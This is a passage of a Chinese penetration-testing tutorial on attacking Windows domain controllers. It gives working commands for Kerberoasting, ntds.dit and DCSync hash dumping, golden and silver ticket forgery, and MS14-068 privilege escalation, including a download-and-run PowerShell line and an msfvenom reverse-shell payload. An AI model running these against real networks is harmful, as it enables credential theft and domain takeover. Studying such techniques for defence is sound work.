<p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。</p>
<p>kerberoast 的利用思路：</p>
<p>1.查询 SPN 寻找在 Users 下并且是高权限域用户的服务</p>
<p>2.请求并导出 TGS</p>
<p>3.对 TGS 进行爆破</p>
<p>这里以 MSSQL 服务为例，并尝试破解该服务的票据</p>
<p>手动注册 SPN</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/DBSRV.teamssix.com:1433 test</span><br></pre></td></tr></table></figure>

<p>查看用户所对应的 SPN</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L teamssix.com\test</span><br></pre></td></tr></table></figure>

<p>也可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性</p>
<p>为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径，将用户添加进去，例如这里添加的用户为 test</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录</span><br></pre></td></tr></table></figure>

<p>因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 tgsreperack.py 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5</p>
<p>在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC_HMAC_MD5</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型</span><br></pre></td></tr></table></figure>

<p>请求指定 SPN 的服务票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SPNName = &#x27;MSSQLSvc/DBSRV.teamssix.com&#x27;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>

<p>或者请求所有服务的服务票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn -q */* | Select-String &#x27;^CN&#x27; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</span><br></pre></td></tr></table></figure>

<p>可以使用 klist 查看本地缓存的票证，看看有没有新的票据</p>
<p>之后在 mimikatz 中执行如下命令，将内存中的票据导出</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>

<p>也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://ghproxy.com/https://raw.githubusercontent.com/EmpireProject/Empire/6ee7e036607a62b0192daed46d3711afc65c3921/data/module_source/credentials/Invoke-Kerberoast.ps1&#x27;);Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl&quot;</span><br></pre></td></tr></table></figure>

<p>或者使用 Rubeus 获取票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>

<p>也可以使用 impacket 获取票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com/test</span><br></pre></td></tr></table></figure>



<p><img src="https://pic1.zhimg.com/v2-5080aa9b4f7113e650e23683f2bc8911_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic1.zhimg.com/80/v2-5080aa9b4f7113e650e23683f2bc8911_720w.jpg?source=3af55fa1" alt="img"></p>
<p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p>
<p>Kerberoast 脚本下载地址：<a href="http://link.zhihu.com/?target=https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsreperack.py password.txt mssql.kirbi</span><br></pre></td></tr></table></figure>

<p>或者使用 hashcat 破解 powershell 脚本.Rubeus.impacket 获取到的服务票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>



<p><img src="https://pic3.zhimg.com/v2-8778e16ae26c2ce0a7f6b4d6bcb91a4b_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic3.zhimg.com/80/v2-8778e16ae26c2ce0a7f6b4d6bcb91a4b_720w.jpg?source=3af55fa1" alt="img"></p>
<h1 id="域控制器安全"><a href="#域控制器安全" class="headerlink" title="域控制器安全"></a>域控制器安全</h1><p><strong>01</strong></p>
<p><strong>前言</strong></p>
<p>对于国内的网络管理者而言，现有的网络安全防护手段大多强调预防外部主动攻击，相对信任内部主机，然而泄密事件或其它各类内网安全事件的频繁发生，这就充分说明了内网安全维护的复杂性。当前很多企业会使用域来管理较为复杂的内部网络， 因为域可以安全集中管理，统一安全策略。</p>
<p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，把域看作一个单位的话，域控制器就相当于门卫（Domain Controller，简写为DC）。域是一个相对严格的计算机群体组合，而域控制器则是这个域内的管理核心。本文将从攻击者的角度出发，针对域控制器安全作出相关的安全探索与研究。</p>
<p><strong>02</strong></p>
<p><strong>域控前置知识</strong></p>
<p><strong>AD</strong></p>
<p>Active Directory，活动目录，存域内各种信息的数据库域内所有的计算机共享一个集中式的目录数据库（又称为活动目录数据库），它包含着整个域内的对象（用户账户.计算机账户.打印机.共享文件等）和安全信息等等，而活动目录负责目录数据库的添加，修改，更新和删除。</p>
<p><strong>组策略</strong></p>
<p>Group Policy，有本地的和域的，域组策略管理能够统一的对域内机器和用户进行管理。</p>
<p><strong>GPO</strong></p>
<p>组策略对象，GPO（Group Policy Object），实际上就是组策略设置的集合。</p>
<p><strong>GPP</strong></p>
<p>Group Policy Preference，组策略首选项，作用似乎是简单化管理。</p>
<p><strong>SYSVOL目录</strong></p>
<p>域中共享文件夹，该文件夹存储组策略数据以及一些配置文件脚本，这些策略可以被共享到域间机器，由于域控机器之间因为要自动同步域数据，SYSVOL文档允许该域内的所有DC机之间进行复制，所有的AD用户都可以访问它，包括普通用户。</p>
<p>所有组策略都存储于如下目录\<DOMAIN>\SYSVOL&lt;DOMAIN&gt;\Policies\</p>
<p><strong>域内身份验证</strong></p>
<p>windows身份验证分两种，一个kerberos一个NTLM，NTLM就是一个用密码哈希进行的挑战应答，kerberos不多说了，在windows域环境中由DC担任KDC。</p>
<p><strong>Golden Ticket &amp; Silver Ticket</strong></p>
<p>黄金票据，是通过krbtgt的密码哈希计算而成的票据，绝对伪造白银票据，通过对TGS的伪造，只能访问伪造的对应服务。</p>
<p><strong>03</strong></p>
<p><strong>域控制器安全</strong></p>
<h2 id="一：GPP解密"><a href="#一：GPP解密" class="headerlink" title="一：GPP解密"></a>一：GPP解密</h2><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。Sysvol文件夹是安装AD时创建的，它用来存放GPO.Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。（注意：C:\Windows\SYSVOL目录下，只有创建组策略脚本登录才能有策略脚本配置文件groups.xml,默认是没有的，在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的私钥。）由于经过身份验证的用户（任何域用户或受信任域中的用户）都具有对SYSVOL的读取权限，所以域中的任何人都可以搜索包含“cpassword”的XML文件的SYSVOL共享，该文件是包含AES加密密码的值。</p>
<h2 id="二：卷影拷贝服务提取ntds-dit"><a href="#二：卷影拷贝服务提取ntds-dit" class="headerlink" title="二：卷影拷贝服务提取ntds.dit"></a>二：卷影拷贝服务提取ntds.dit</h2><p>在活动目录中，所有的数据都保存在ntds.dit文件中，ntds.dit是一个二进制文件，存储位置为域控制器的%SYSTEMRoot%\ntds\ntds.dit 目录下。包括用户名.散列值.组.GPP.OU 等活动目录相关信息。和SAM文件一样，都是被Windows操作系统锁定的。系统运维人员会利用卷影拷贝服务（VSS）实现这些操作，VSS本质上属快照技术的一种，主要用于备份和恢复功能。（即使目标文件当前处于锁定状态）</p>
<p><strong>通过ntdsutil.exe提取ntds.dit：</strong></p>
<p>创建一个快照，该快照包含Windows系统中的所有文件，且在复制文件时不会触发windows的锁机制。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704545.png" alt="img"></p>
<p>ntdsutil  snapshot “activate instance ntds”  create quit quit</p>
<p><strong>装载快照：</strong></p>
<p><strong><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704305.jpeg" alt="img"></strong></p>
<p>复制快照：</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704072.jpeg" alt="img"></p>
<p>这时我们就拿到了ntds.dit，可以利用hash 进行哈希传递攻击登录其他内网主机。</p>
<h2 id="三：利用dcsync获取域散列值"><a href="#三：利用dcsync获取域散列值" class="headerlink" title="三：利用dcsync获取域散列值"></a>三：利用dcsync获取域散列值</h2><p><strong>（1）Mimikatz获取散列值</strong></p>
<p>Mimikatz有一个dcsync的功能，可以利用卷影拷贝服务直接读取ntds.dit文件并检索域散列值，需要注意的是该功能必须使用管理员权限mimikatz才可以读取ntds.dit。在域内的任意一台机器中，以域管理员权限打开命令环境运行mimikatz：</p>
<p>mimikatz.exe privilege::debug “lsadump::dcsync &#x2F;domain:test.com &#x2F;all &#x2F;csv” exit</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704478.png" alt="img"></p>
<p>如上图，可以成功导出域内所有用户的哈希散列值。</p>
<p><strong>（2）powershell获取散列值</strong></p>
<p>使用Invoke-DCSync.ps1脚本读取ntds.dit以获取账号域散列值，该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-DCSync</span>.ps1<span class="built_in">Invoke-DCSync</span> <span class="literal">-DumpForest</span> | <span class="built_in">ft</span> <span class="literal">-wrap</span> <span class="literal">-autosize</span>    // 导出域内所有用户的hash<span class="built_in">Invoke-DCSync</span> <span class="literal">-DumpForest</span> <span class="literal">-Users</span> <span class="selector-tag">@</span>(<span class="string">&quot;administrator&quot;</span>) | <span class="built_in">ft</span> <span class="literal">-wrap</span> <span class="literal">-autosize</span>      // 导出域内administrator账户的hash</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704421.jpeg" alt="img"></p>
<h2 id="四：票据传递攻击"><a href="#四：票据传递攻击" class="headerlink" title="四：票据传递攻击"></a>四：票据传递攻击</h2><p><strong>4.1</strong>  <strong>黄金票据(Golden Tickets)</strong></p>
<p>域中有一个特殊用户叫做 krbtgt，该用户是用于 Kerberos 身份验证的帐户，如果攻击者获得了该用户的 hash就可以伪造票据进行票据传递，即使域管理员修改密码也不会改变 krbtgt。</p>
<p>域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到 krbtgt 的密码 Hash，就可以随意伪造 Ticket，进而使用 Ticket 登陆域控制器。使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket。</p>
<p><strong>示例：获取 krbtgt 用户哈希 ：</strong></p>
<p>需要域管理员或者其他类似的高权限账户。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704364.png" alt="img"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111704582.png" alt="img"></p>
<p><strong>获取域 SID（去掉 1104 才是 sid）：</strong></p>
<p><strong><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705720.png" alt="img"></strong></p>
<p>访问域控：</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705893.png" alt="img"></p>
<p><strong>生成黄金票据并注入内存：</strong></p>
<p>kerberos::golden &#x2F;admin:administrator &#x2F;domain:test.com &#x2F;sid:S-1-5-21-1028651032- </p>
<p>493791261-3989376960&#x2F;krbtgt:870abec9d90ce0f8567c102bc22c6a80&#x2F;ticket:golden.kiribi</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705005.jpeg" alt="img"></p>
<p>再次访问域控：</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705246.png" alt="img"></p>
<p><strong>4.2</strong>  <strong>白银票据(Silver Tickets)</strong></p>
<p>白银票据不与 KDC 交互，伪造 Ticket 直接与 server 进行交互。我们来看一下 windows 认证的第六步，server 接收到客户端的数据包后，使用自己的密码 hash 解密 ticket 得出 session key，在使用 session key 解密 Authenticator 和 timestamp 即可通过验证。所以我们只需要知道 server 用户的 hash 就可以伪造出 一个 ticket，这就是白银票据。</p>
<p><strong>示例：获取服务 hash(这里使用 cifs，这一步需要在域控上运行)：</strong></p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705579.jpeg" alt="img"></p>
<p>获取 sid：</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705891.jpeg" alt="img"></p>
<p>访问域控文件共享：</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705188.png" alt="img"></p>
<p><strong>生成票据并注入内存 ：</strong></p>
<p>这里和刚才用法不一样，这里生成后直接注入，无需手动注入。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705428.jpeg" alt="img"></p>
<p>再次访问：</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111705773.jpeg" alt="img"></p>
<h2 id="五：Exchange漏洞"><a href="#五：Exchange漏洞" class="headerlink" title="五：Exchange漏洞"></a><strong>五：Exchange漏洞</strong></h2><p>近些年来通过渗透邮件服务器获取权限，并一路拿到域控的案列越来越多。因为Exchange 邮箱服务器默认在域中具有高权限，可以修改域内的 AC。借此攻击者通过赋予Dcsync ACL 给指定的用户，进而导出域内哈希，拿下域控。限于本期篇幅，在此不再展示具体步骤。以下是笔者收集的相关漏洞及利用方式，供大家参考借鉴。</p>
<p><strong>5.1</strong>  <strong>CVE-2018-8581：任意用户位置漏洞</strong></p>
<p>该漏洞允许任何经过身份验证的用户冒充 ExchangeServer 上的其他任意用户，可用来盗取exchange的管理员权限。</p>
<p><strong>攻击方式一</strong>：将经过验证的普通用户接管管理员所有邮件信息。</p>
<p><strong>利用条件</strong>：普通账号。</p>
<p>攻击脚本：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WyAtu/CVE-2018-8581">https://github.com/WyAtu/CVE-2018-8581</a></p>
<p><strong>攻击方式二</strong>：将普通用户提升至域管理员权限。</p>
<p><strong>利用条件</strong>：普通账号，在内网发起攻击。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PrivExchange">https://github.com/dirkjanm/PrivExchange</a> <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p><strong>5.2</strong>  <strong>CVE-2019-1040：Windows NTLM篡改漏洞</strong></p>
<p><strong>攻击方式一</strong>：攻击域Exchange  Server</p>
<p>利用姿势：使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。</p>
<p>攻击脚本：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040">https://github.com/Ridter/CVE-2019-1040</a></p>
<p><strong>利用方式二</strong>：攻击域控服务器</p>
<p>利用姿势：使用中继的LDAP身份验证，将目标服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户。攻击者作为受害者服务器上的任何用户进行身份验证。</p>
<p><strong>攻击脚本：</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040-dcpwn">https://github.com/Ridter/CVE-2019-1040-dcpwn</a></p>
<p><strong>5.3</strong>  <strong>CVE-2020-0688：Microsoft Exchage 远程代码执行漏洞</strong></p>
<p><strong>漏洞描述</strong>：当攻击者通过各种手段获得一个可以访问Exchange Control Panel （ECP）组件的用户账号密码，就可以在被攻击的exchange上执行任意代码，直接获取服务器权限。</p>
<p><strong>利用条件</strong>：Exchange Server 2010 SP3&#x2F;2013&#x2F;2016&#x2F;2019，普通账号。</p>
<p><strong>攻击脚本</strong>：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/random-robbie/cve-2020-0688">https://github.com/random-robbie/cve-2020-0688</a></p>
<p><strong>5.4</strong> <strong>CVE-2020-16875：Microsoft Exchage 远程代码执行漏洞</strong></p>
<p><strong>漏洞描述</strong>：远程攻击者通过构造特殊的cmdlet参数，可造成任意命令执行。</p>
<p><strong>利用条件</strong>：Exchange Server 2016&#x2F;2019，普通账号。</p>
<p><strong>攻击脚本：</strong></p>
<p><a target="_blank" rel="noopener" href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p>
<p><strong>5.5</strong> <strong>CVE-2020-17144：Microsoft Exchage 远程代码执行漏洞</strong></p>
<p><strong>漏洞描述：</strong>远程攻击者通过构造特殊的cmdlet参数，绕过身份验证利用改漏洞可造成任意远程命令执行。</p>
<p><strong>利用条件：</strong>Exchange2010，普通账号。</p>
<p><strong>攻击脚本1：</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Airboi/CVE-2020-17144-EXP">https://github.com/Airboi/CVE-2020-17144-EXP</a></p>
<p><strong>攻击脚本2：</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/CVE-2020-17144">https://github.com/zcgonvh/CVE-2020-17144</a></p>
<p><strong>06</strong></p>
<p><strong>总结</strong></p>
<p>相对于公网的层层防护，内网环境往往更为脆弱。而域安全只是内网防护的一部分，如果能了解到攻击者是如何入侵内网环境的，就可以更安全地部署内网环境，更有效的防范攻击行为。</p>
<p>针对AD域控的攻击和防御，需要了解一系列基础知识，否则无法理解攻击手段，更无法阻断攻击链。内网安全部分我们在后续内刊文章中会继续介绍，敬请期待。</p>
<h2 id="六：Kerberos-域用户提权漏洞"><a href="#六：Kerberos-域用户提权漏洞" class="headerlink" title="六：Kerberos 域用户提权漏洞"></a>六：Kerberos 域用户提权漏洞</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p>
<p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p>
<p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p>
<h3 id="1-PyKEK"><a href="#1-PyKEK" class="headerlink" title="1.PyKEK"></a>1.PyKEK</h3><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a href="http://link.zhihu.com/?target=https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p>
<p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p>
<p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get hotfixid | findstr KB3011780</span><br></pre></td></tr></table></figure>

<p>查看当前用户 SID</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>

<p>或者使用 wmic </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p>生成高权限票据，-d 指定域控地址</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456</span><br></pre></td></tr></table></figure>

<p>打开 mimikatz 清除当前内存中的票据信息</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>

<p>将高权限票据注入内存</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;</span><br></pre></td></tr></table></figure>

<p>使用 net use 连接域控后，使用 psexec 获取 Shell</p>
<blockquote>
<p> 这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p>
</blockquote>
<p><img src="https://pic1.zhimg.com/v2-ee848ffd69b49de9b2bc72f1488e01e5_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic1.zhimg.com/80/v2-ee848ffd69b49de9b2bc72f1488e01e5_720w.jpg?source=3af55fa1" alt="img"></p>
<h3 id="2-GoldenPac"><a href="#2-GoldenPac" class="headerlink" title="2.GoldenPac"></a>2.GoldenPac</h3><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p>
<p>Kali 在使用之前需要先安装 Kerberos 客户端</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install krb5-user -y</span><br></pre></td></tr></table></figure>

<p>利用 goldenPac.py 获取 Shell</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 goldenPac.py 0day.org/jack:Aa123456@OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p>
</blockquote>
<p><img src="https://pic4.zhimg.com/v2-c1f4db333cdf3826461c499c6679c693_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic4.zhimg.com/80/v2-c1f4db333cdf3826461c499c6679c693_720w.jpg?source=3af55fa1" alt="img"></p>
<p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p>
<h3 id="3-kekeo"><a href="#3-kekeo" class="headerlink" title="3.kekeo"></a>3.kekeo</h3><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a href="http://link.zhihu.com/?target=https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
<p>使用之前需要先清除票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure>

<p>然后直接使用 kekeo 生成高权限票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 /domain:0day.org /user:jack /password:Aa123456 /ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p>
<h3 id="4-MSF"><a href="#4-MSF" class="headerlink" title="4.MSF"></a>4.MSF</h3><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br><span class="line">set domain 0day.org</span><br><span class="line">set password Aa123456</span><br><span class="line">set user jack</span><br><span class="line">set user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133</span><br><span class="line">set rhosts OWA2010SP3.0day.org</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>设置好域名.域控 IP.密码.用户.SID 后运行，将会获取一个 bin 文件</p>
<p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; /export</span><br></pre></td></tr></table></figure>

<p>之后，生成一个木马</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.214.74 lport=4444 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p>将木马复制到目标主机上，并使其上线到 MSF</p>
<p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kerberos_ticket_use /tmp/0-00000000-jack@krbtgt-0DAY.ORG.kirbi</span><br><span class="line">background</span><br></pre></td></tr></table></figure>

<p>之后使用 current_user_psexec 模块</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/current_user_psexec</span><br><span class="line">set session 2</span><br><span class="line">set rhosts OWA2010SP3.0day.org</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.214.74</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后就会返回高权限的会话</p>
<blockquote>
<p> 不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p>
</blockquote>
<h3 id="5-CS"><a href="#5-CS" class="headerlink" title="5.CS"></a>5.CS</h3><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p>
<p>KrbCredExport 下载地址：<a href="http://link.zhihu.com/?target=https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket</span><br></pre></td></tr></table></figure>

<p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p>
<p><img src="https://pica.zhimg.com/v2-6e908b86855301163b5fd7b3e32f17e4_720w.jpg?source=3af55fa1" alt="img"><img src="https://pica.zhimg.com/80/v2-6e908b86855301163b5fd7b3e32f17e4_720w.jpg?source=3af55fa1" alt="img"></p>
<p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p>
<p><img src="https://pica.zhimg.com/v2-da68442a64a29bfbf195ebfdfdf00723_720w.jpg?source=3af55fa1" alt="img"><img src="https://pica.zhimg.com/80/v2-da68442a64a29bfbf195ebfdfdf00723_720w.jpg?source=3af55fa1" alt="img"></p>
<h2 id="七：黄金票据"><a href="#七：黄金票据" class="headerlink" title="七：黄金票据"></a>七：黄金票据</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p>
<ul>
<li>伪造的域管理员用户名</li>
<li>完整的域名</li>
<li>域 SID</li>
<li>krbtgt 的 NTLM Hash 或 AES-256 值</li>
</ul>
<p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p>
<p>在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p>
<h3 id="1-导出-krbtgt-的-NTLM-Hash"><a href="#1-导出-krbtgt-的-NTLM-Hash" class="headerlink" title="1.导出 krbtgt 的 NTLM Hash"></a>1.导出 krbtgt 的 NTLM Hash</h3><p>在 mimikatz 下执行以下命令</p>
